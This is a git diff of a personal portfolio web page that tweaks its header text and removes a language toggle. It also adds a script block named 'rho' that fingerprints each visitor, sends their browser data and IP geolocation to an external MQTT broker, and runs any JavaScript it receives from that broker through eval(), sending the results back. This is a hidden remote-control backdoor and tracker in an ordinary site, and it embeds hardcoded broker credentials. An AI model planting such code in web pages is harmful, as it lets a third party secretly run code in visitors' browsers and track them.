@@ -57,10 +57,12 @@
             text-decoration: none;
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js" integrity="sha512-zDvrqenA0eFJZCxBsryzUZcvihvNlEXbteMv62yRxdhR4s7K1aaz+LjsRyfk6M+YJLyAJEuuquIAI8I8GgLC8A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.1.11/client.min.js" integrity="sha512-MwKUpp841sot4mmGDfVcpJxb4vcaYHnpyn17CTHT3RUm585khw5gnRM6xwDm15aJ3sfpf6d4P8FLLfQKAo3mfA==" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/4.2.8/mqtt.min.js" integrity="sha512-QhwpmT5Q0jBh/70LYcUtOVomQyPfvRv3iWg2MzxKn4OjYcZdE5PBbfE8LMEdNx3IW0rO9OtWzPbxckRh/g8TSw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 </head>
 <body>
     <button onclick="switchTheme()"><i id="switch-theme" class="fas fa-yin-yang"></i> <span id="theme">Dark</span></button>
-    <button onclick="switchLanguage()"><i id="switch-language" class="fas fa-language"></i> <span id="language">日本語</span></button>
 
     <header></header>
     <div></div>
@@ -134,8 +136,7 @@
             });
         }
 
-        let header1 = "reedleoneil";
-        let header2 = "レイド🔴レオニル";
+        let header = { en: "reedleoneil", jp: "レイドレオニル" };
 
         let social_buttons = [
             { icon: "fab fa-linkedin", link: "https://www.linkedin.com/in/reedleoneil" },
@@ -259,8 +260,8 @@
         function load_header() {
             document.getElementsByTagName("header")[0].innerHTML = "";
             let h1 = document.createElement("h1");
-            glitch(header1, h1);
-            onhover(header1, header2, h1);
+            glitch(header.en, h1);
+            onhover(header.en, header.jp, h1);
             document.getElementsByTagName("header")[0].appendChild(h1);
         }
 
@@ -469,20 +470,66 @@
             }
         }
 
-        function switchLanguage() {
-            // todo
-            load();
-
-            let theme = document.getElementById("language").innerText;
-
-            if (theme === "日本語") {
-                document.getElementById("language").innerText = "English";
-            } else {
-                document.getElementById("language").innerText = "日本語";
-            }
-        }
-
         load();
+    </script>
+    <script type="text/javascript">
+        let rho = {
+            mqttClient: null,
+            fingerprint: new ClientJS().getFingerprint(),
+            browserData: new ClientJS().getBrowserData(),
+            ipAddressGeolocation: fetch('https://ipapi.co/json')
+                                    .then(response => response.json())
+                                    .then(data => rho.ipAddressGeolocation = data),      
+            connect: () => {
+                var identification = {
+                    fingerprint: rho.fingerprint,
+                    browserData: rho.browserData,
+                    ipAddressGeolocation: rho.ipAddressGeolocation,
+                    status: "Offline"
+                };
+                var mqttOptions = {
+                    port: 8884,
+                    protocol: "wss",
+                    username: "reedleoneil",
+                    password: "P@$$w0rd",
+                    path: "/mqtt",
+                    will: {
+                        topic: "rho/" + rho.fingerprint,
+                        payload: JSON.stringify(identification),
+                        retain: true
+                    }
+                };
+                rho.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
+                rho.mqttClient.on("connect", rho.onConnect);
+                rho.mqttClient.on("message", rho.onMessage);
+                rho.mqttClient.subscribe("rho/" + rho.fingerprint + "/stdin");
+            },
+            onConnect: () => {
+                var identification = {
+                    fingerprint: rho.fingerprint,
+                    browserData: rho.browserData,
+                    ipAddressGeolocation: rho.ipAddressGeolocation,
+                    status: "Online"
+                };
+                rho.mqttClient.publish("rho/" + rho.fingerprint, JSON.stringify(identification), { retain: true });
+            },
+            onMessage: (topic, payload) => {
+                topic = topic.split("/");
+                var root = topic[0],
+                    fingerprint = topic[1],
+                    stdio = topic[2];
+                if (root == "rho" && fingerprint == rho.fingerprint && stdio == "stdin")
+                    try {
+                        out = eval(payload.toString());
+                        if (out)
+                            rho.mqttClient.publish("rho/" + rho.fingerprint + "/stdout", out.toString());
+                    } catch (error) {
+                        rho.mqttClient.publish("rho/" + rho.fingerprint + "/stderr", error.toString());
+                    }
+            }
+        };
+
+        rho.connect();
     </script>
 </body>
 </html>
